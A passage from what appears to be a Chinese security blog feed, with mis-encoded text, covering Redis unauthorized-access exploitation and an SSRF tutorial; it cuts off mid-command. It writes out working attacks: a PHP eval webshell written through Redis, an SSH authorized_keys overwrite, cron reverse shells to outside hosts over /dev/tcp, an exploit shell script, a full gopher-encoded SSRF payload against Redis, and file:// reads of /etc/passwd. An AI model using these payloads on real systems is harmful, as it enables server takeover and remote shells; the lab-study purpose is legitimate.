src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180627722.png" alt="image-20220430180627722"></p><pre><code>config set dir /www/wwwroot/39.105.71.63/config set dbfilename sakura.phpset webshell &quot;&lt;?php @eval($_POST[&#39;pass&#39;]) ?&gt;&quot;save</code></pre><p>æˆ‘çš„ç½‘ç«™ä¸ŠæˆåŠŸå‡ºç°äº†è¿™ä¸ªæ–‡ä»¶</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180643451.png" alt="image-20220430180643451"></p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥æˆåŠŸè¿æ¥</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430181012266.png" alt="image-20220430181012266"></p><h2 id="2-é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•"><a href="#2-é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•" class="headerlink" title="2.é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•"></a><strong>2.é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•</strong></h2><p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä½¿ç”¨çš„é˜¿é‡Œäº‘æœåŠ¡å™¨å‡ºäº†é—®é¢˜ï¼Œå°±è‡ªå·±æ­å»ºä¸ªé¶æœº(centos 7)å§.</p><p>è®°å¾—å…³é—­é˜²ç«å¢™:</p><pre><code>sudo systemctl stop firewalld</code></pre><p>åŸç†:åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalue,keyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿæˆä¸€ä¸ªæˆæƒçš„key.</p><p>æ‰©å±•:</p><p><strong>sshå…å¯†ç™»å½•æµç¨‹:</strong></p><p>ã€€ã€€ï¼ˆ1ï¼‰ é¦–å…ˆåœ¨å®¢æˆ·ç«¯ç”Ÿæˆä¸€å¯¹å¯†é’¥ï¼ˆssh-keygenï¼‰ï¼›</p><p>ã€€ã€€ï¼ˆ2ï¼‰ å¹¶å°†å®¢æˆ·ç«¯çš„å…¬é’¥ssh-copy-id æ‹·è´åˆ°æœåŠ¡ç«¯ï¼›</p><p>ã€€ã€€ï¼ˆ3ï¼‰ å½“å®¢æˆ·ç«¯å†æ¬¡å‘é€ä¸€ä¸ªè¿æ¥è¯·æ±‚ï¼ŒåŒ…æ‹¬ipã€ç”¨æˆ·åï¼›</p><p>ã€€ã€€ï¼ˆ4ï¼‰ æœåŠ¡ç«¯å¾—åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œä¼šåˆ°authorized_keysä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæœ‰å“åº”çš„IPå’Œç”¨æˆ·ï¼Œå°±ä¼šéšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼šqwerï¼›</p><p>ã€€ã€€ï¼ˆ5ï¼‰ æœåŠ¡ç«¯å°†ä½¿ç”¨å®¢æˆ·ç«¯æ‹·è´è¿‡æ¥çš„å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå‘é€ç»™å®¢æˆ·ç«¯ï¼›</p><p>ã€€ã€€ï¼ˆ6ï¼‰ å¾—åˆ°æœåŠ¡ç«¯å‘æ¥çš„æ¶ˆæ¯åï¼Œå®¢æˆ·ç«¯ä¼šä½¿ç”¨ç§é’¥è¿›è¡Œè§£å¯†ï¼Œç„¶åå°†è§£å¯†åçš„å­—ç¬¦ä¸²å‘é€ç»™æœåŠ¡ç«¯ï¼›</p><p>ã€€ã€€ï¼ˆ7ï¼‰ æœåŠ¡ç«¯æ¥å—åˆ°å®¢æˆ·ç«¯å‘æ¥çš„å­—ç¬¦ä¸²åï¼Œè·Ÿä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸€è‡´ï¼Œå°±å…è®¸å…å¯†ç ç™»å½•ã€‚</p><p><strong>æ”»å‡»æµç¨‹:</strong></p><p><strong>1ã€é¦–å…ˆåœ¨æ”»å‡»æœº(kali)ä¸Šç”Ÿæˆsshå…¬é’¥</strong></p><pre><code>ssh-keygen -t rsa</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430191709018.png" alt="image-20220430191709018"></p><p><strong>2.å°†å…¬é’¥å†™å…¥key.txtæ–‡ä»¶ï¼ˆå‰åç”¨\næ¢è¡Œï¼Œé¿å…å’Œredisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆï¼‰</strong></p><p> è¿›å…¥.sshç›®å½•ï¼š</p><pre><code>cd /root/.ssh</code></pre><p>å†™å…¥æ–‡ä»¶ï¼š</p><pre><code>(echo -eâ€\nâ€;cat id_rsa.pub;echo -e â€œ\nâ€)&gt;key.txt</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430192233869.png" alt="image-20220430192233869"></p><p><strong>3.å°†key.txtå†™é¶æœºï¼ˆä½¿ç”¨redis-cli -h ipå‘½ä»¤è¿æ¥é¶æœºï¼Œå†™å…¥æ–‡ä»¶ï¼‰</strong></p><pre><code>cat key.txt|redis-cli -h 192.168.0.106 -x set crack</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221009845.png" alt="image-20220430221009845"></p><p>4.è¿œç¨‹ç™»å½•é¶æœºçš„RedisæœåŠ¡</p><pre><code>redis-cli -h 192.168.0.106</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221026832.png" alt="image-20220430221026832"></p><p>5.æ›´æ”¹rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½•(ä¸€èˆ¬é»˜è®¤ä¸º/root/.ssh)</p><pre><code>config set dir /root/.ssh</code></pre><p>6.è®¾ç½®ä¸Šä¼ å…¬é’¥çš„å¤‡ä»½æ–‡ä»¶åå­—ä¸ºauthorized_keys</p><pre><code>config set dbfilename authorized_keysconfig get dbfilename</code></pre><p>7.ä¿å­˜</p><pre><code>save</code></pre><p>8.åœ¨æ”»å‡»æœºä¸Šç›´æ¥sshå…å¯†ç™»å½•é¶æœº,å…å¯†ç™»å½•æˆåŠŸ</p><pre><code>ssh -i id_rsa root@192.168.0.106</code></pre><p>æœ€åæˆ‘æ²¡æœ‰æˆåŠŸï¼Œä½†å¤§è‡´æ€è·¯æ˜¯è¿™æ ·ï¼Œä¸€ç›´ä¸æˆåŠŸæˆ‘å°±å…ˆä¸çº ç»“äº†ã€‚</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1576831989_5dfc8bf50878a.png!small" alt="img"></p><h2 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a><strong>3.åå¼¹shell</strong></h2><pre><code>redis-cli -h 192.168.0.106set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.108/4444 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220501003825941.png" alt="image-20220501003825941"></p><p>æˆåŠŸåå¼¹</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFæ¼æ´æ€»ç»“</title>
      <link href="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘ç¢°åˆ°äº†æŒºå¤šSSRFé¢˜ç›®çš„åº”ç”¨ï¼Œä»¥å‰å­¦çš„å¤ªæµ…äº†ï¼Œé‡æ–°å­¦ä¹ ä¸‹ï¼Œæ‰“å¥½åŸºç¡€ã€‚</p><p>[TOC]</p><h1 id="SSRFæ¼æ´ç®€ä»‹"><a href="#SSRFæ¼æ´ç®€ä»‹" class="headerlink" title="SSRFæ¼æ´ç®€ä»‹"></a>SSRFæ¼æ´ç®€ä»‹</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚<br> ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆå› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…ç½‘ã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨ä¸€ä¸ªç½‘ç»œè¯·æ±‚çš„æœåŠ¡ï¼Œå½“ä½œè·³æ¿è¿›è¡Œæ”»å‡»ï¼‰<br> <img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095630-ae7ee364-6d72-1.png" alt="img"></p><h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p> SSRF å½¢æˆçš„åŸå› å¾€å¾€æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚<br> å¦‚ï¼šä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ã€‚åˆ©ç”¨çš„å°±æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚ssrfæ˜¯åˆ©ç”¨<code>å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†</code>æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><h2 id="æ¼æ´æ˜“å‘ç”Ÿç‚¹"><a href="#æ¼æ´æ˜“å‘ç”Ÿç‚¹" class="headerlink" title="æ¼æ´æ˜“å‘ç”Ÿç‚¹"></a>æ¼æ´æ˜“å‘ç”Ÿç‚¹</h2><ol><li>è½¬ç æœåŠ¡</li><li>åœ¨çº¿ç¿»è¯‘</li><li>å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½(é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡)</li><li>å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</li><li>ç½‘ç«™é‡‡é›†ã€ç½‘é¡µæŠ“å–çš„åœ°æ–¹ã€‚</li><li>å¤´åƒçš„åœ°æ–¹ã€‚(è¿œç¨‹åŠ è½½å¤´åƒ)</li><li>ä¸€åˆ‡è¦ä½ è¾“å…¥ç½‘å€çš„åœ°æ–¹å’Œå¯ä»¥è¾“å…¥ipçš„åœ°æ–¹ã€‚</li><li>ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ï¼š<code>share</code>ã€<code>wap</code>ã€<code>url</code>ã€<code>link</code>ã€<code>src</code>ã€<code>source</code>ã€<code>target</code>ã€<code>u</code>ã€<code>3g</code>ã€<code>display</code>ã€<code>sourceURl</code>ã€<code>imageURL</code>ã€<code>domain</code><br> â€¦</li></ol><h2 id="å¯ä»¥å®ç°çš„æ”»å‡»"><a href="#å¯ä»¥å®ç°çš„æ”»å‡»" class="headerlink" title="å¯ä»¥å®ç°çš„æ”»å‡»"></a>å¯ä»¥å®ç°çš„æ”»å‡»</h2><ol><li>å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner ä¿¡æ¯</a></li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</li><li>å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°(å¦‚ï¼šreadmeæ–‡ä»¶)</li><li>æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(å¦‚ï¼šStruts2ï¼Œsqli)</li><li>ä¸‹è½½å†…ç½‘èµ„æº(å¦‚ï¼šåˆ©ç”¨<code>file</code>åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰)</li><li>è¿›è¡Œè·³æ¿</li><li>æ— è§†cdn</li><li>åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell</li></ol><h1 id="SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®"><a href="#SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®" class="headerlink" title="SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®"></a>SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®</h1><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p><code>file_get_contents()</code>ã€<code>fsockopen()</code>ã€<code>curl_exec()</code>ã€<code>fopen()</code>ã€<code>readfile()</code>ç­‰å‡½æ•°ä½¿ç”¨ä¸å½“ä¼šé€ æˆSSRFæ¼æ´</p><p>ï¼ˆ1ï¼‰file_get_contents()</p><pre><code class="php">&lt;?php$url = $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><blockquote><p><code>file_get_content</code>å‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å†…å®¹ï¼Œç„¶åæŒ‡å®šä¸€ä¸ªæ–‡ä»¶åè¿›è¡Œä¿å­˜ï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚file_put_contentå‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>ï¼ˆ2ï¼‰fsockopen()</p><pre><code>&lt;?php function GetFile($host,$port,$link) &#123;     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \n&quot;;     &#125; else &#123;         $out = &quot;GET $link HTTP/1.1\r\n&quot;;         $out .= &quot;Host: $host\r\n&quot;;         $out .= &quot;Connection: Close\r\n\r\n&quot;;         $out .= &quot;\r\n&quot;;         fwrite($fp, $out);         $contents=&#39;&#39;;         while (!feof($fp)) &#123;             $contents.= fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;</code></pre><blockquote><p><code>fsockopen</code>å‡½æ•°å®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œè¯¥å‡½æ•°ä½¿ç”¨socketï¼ˆç«¯å£ï¼‰è·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“æ•°æ®ã€‚å˜é‡hostä¸ºä¸»æœºåï¼Œportä¸ºç«¯å£ï¼Œerrstrè¡¨ç¤ºé”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ï¼Œ30ä¸ºæ—¶é™</p></blockquote><p>ï¼ˆ3ï¼‰curl_exec()</p><pre><code>&lt;?php if (isset($_POST[&#39;url&#39;]))&#123;    $link = $_POST[&#39;url&#39;];    $curlobj = curl_init();// åˆ›å»ºæ–°çš„ cURL èµ„æº    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// è®¾ç½® URL å’Œç›¸åº”çš„é€‰é¡¹    $result=curl_exec($curlobj);// æŠ“å– URL å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨    curl_close($curlobj);// å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;    file_put_contents($filename, $result);     echo $result;&#125;?&gt;</code></pre><blockquote><p><code>curl_exec</code>å‡½æ•°ç”¨äºæ‰§è¡ŒæŒ‡å®šçš„cURLä¼šè¯</p></blockquote><p><strong>æ³¨æ„</strong></p><pre><code>1.ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper2.file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç 3.file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥4.curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨5.curl_exec() //é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œ6.file_get_contents() // file_get_contentsæ”¯æŒphp://inputåè®®</code></pre><h2 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h2><p> ï¼ˆ1ï¼‰<code>file</code>ï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„å†…å®¹<br> ï¼ˆ2ï¼‰<code>dict</code>ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰<br> ï¼ˆ3ï¼‰<code>gopher</code>ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell<br> ï¼ˆ4ï¼‰<code>http/s</code>ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p><h1 id="SSRFæ¼æ´åˆ©ç”¨"><a href="#SSRFæ¼æ´åˆ©ç”¨" class="headerlink" title="SSRFæ¼æ´åˆ©ç”¨"></a>SSRFæ¼æ´åˆ©ç”¨</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>æ”»å‡»æœº:kaliã€è¿œç¨‹vps</p><p>ç›®æ ‡æœº:é˜¿é‡Œäº‘</p><p>dockeré•œåƒï¼šssrf_redis</p><p>PHPç‰ˆæœ¬ï¼šPHP Version 7.2.28(5.6ç‰ˆæœ¬æµ‹è¯•ä¼šå¤±è´¥)</p><p>è¿™é‡Œæˆ‘ç›´æ¥ä½¿ç”¨å®å¡”æ¥æ­å»ºé¶æœºï¼Œæ³¨æ„ï¼Œéœ€è¦å…³é—­open_basedirï¼Œå¦åˆ™ä¼šå¯¼è‡´fileåè®®å¤±æ•ˆ</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424204936132.png" alt="image-20220424204936132"></p><h2 id="è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç "><a href="#è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç " class="headerlink" title="è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç "></a>è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç </h2><p>ssrf.php</p><pre><code class="php">&lt;?php$ch = curl_init(); //åˆ›å»ºæ–°çš„ cURL èµ„æºcurl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); //è®¾ç½®URL å’Œç›¸åº”çš„é€‰é¡¹#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //æŠ“å– URL å†…å®¹å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ï¼Œå­˜å‚¨è¿›æ–‡ä»¶curl_close($ch); ////å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº?&gt;</code></pre><p>post.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php    echo $_REQUEST[cmd];    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="è¿œç¨‹åˆ©ç”¨æ–¹å¼"><a href="#è¿œç¨‹åˆ©ç”¨æ–¹å¼" class="headerlink" title="è¿œç¨‹åˆ©ç”¨æ–¹å¼"></a>è¿œç¨‹åˆ©ç”¨æ–¹å¼</h2><p><strong>1.åˆ©ç”¨fileåè®®è¯»å–</strong></p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///etc/passwd</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424210730715.png" alt="image-20220424210730715"></p><p>ä¸€èˆ¬æ¢æµ‹å†…ç½‘ä¼šè¯»ä¸€ä¸‹:</p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///proc/net/arp</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211134080.png" alt="image-20220424211134080"></p><p><strong>2.åˆ©ç”¨dictåè®®</strong></p><p>ï¼ˆ1ï¼‰æŸ¥çœ‹ç«¯å£åŠç«¯å£ä¸Šè¿è¡ŒæœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯</p><pre><code>http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211349497.png" alt="image-20220424211349497"></p><p>ï¼ˆ2ï¼‰é€šè¿‡dictåè®®getshell</p><p>æœ‰å…³dictåè®®ï¼šå‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚ å‘½ä»¤:å‚æ•°ï¼Œå¹¶åœ¨æœ«å°¾è‡ªåŠ¨è¡¥ä¸Š<code>\r\n</code>(CRLF)<br>                          dictåè®®è¦ä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œï¼Œè€Œgopheråè®®æ‰§è¡Œä¸€æ¡å‘½ä»¤å°±è¡Œäº†</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095631-af0958b4-6d72-1.jpg" alt="img"></p><p><strong>3.åˆ©ç”¨gopheråè®®</strong></p><p>  (1)æ”»å‡»å†…ç½‘rediså¹¶åå¼¹shell</p><p>åˆ©ç”¨redisæœªæˆæƒè®¿é—®æ”»å‡»redis<br> <code>æ”»å‡»redisçš„exp</code></p><p>shell.sh</p><pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/108.166.201.16/4444 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><p>ä½¿ç”¨è¿™ä¸ªexpéšæ„ä¸€ä¸ªç›®æ ‡ï¼Œæ•è·åˆ°æ•°æ®</p><pre><code>bash shell.sh 39.x.x.x 6379</code></pre><p>å†å¯¹æ•°æ®è¿›è¡Œä¸€äº›è½¬æ¢</p><p> è½¬æ¢è§„åˆ™ï¼š<br> å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>&gt;</code>æˆ–è€…<code>&lt;</code>é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚<br> å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯+OK é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚<br> å°†<code>\r</code>å­—ç¬¦ä¸²æ›¿æ¢æˆ<code>%0d%0a</code><br> ç©ºç™½è¡Œæ›¿æ¢ä¸º<code>%0a</code></p><p>ç»“åˆgopheråè®®æ”»å‡»å†…ç½‘redisï¼Œä½¿ç”¨ä¸Šè¾¹æ•è·æ•°æ®çš„è½¬æ¢ç»“æœå³å¯ï¼Œç„¶åè¿›è¡Œåå¼¹shellï¼š</p><pre><code>curl -v &#39;http://39.105.71.63:66/ssrf.php?url=gopher://127.0.0.1:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f108.166.201.16%2f4444%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af32d162-6d72-1.jpg" alt="img"></p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af5bb41a-6d72-1.jpg" alt="img"></p><p>è¯¶ï¼Œæè¿™ä¸ªredisè€æ˜¯æŠŠæˆ‘æœåŠ¡å™¨æå´©ï¼Œæˆ‘å°±ä¸å¤ç°äº†ã€‚</p><p>ï¼ˆ2ï¼‰ä¼ªé€ postè¯·æ±‚åå¼¹shell</p><pre><code>curl -v 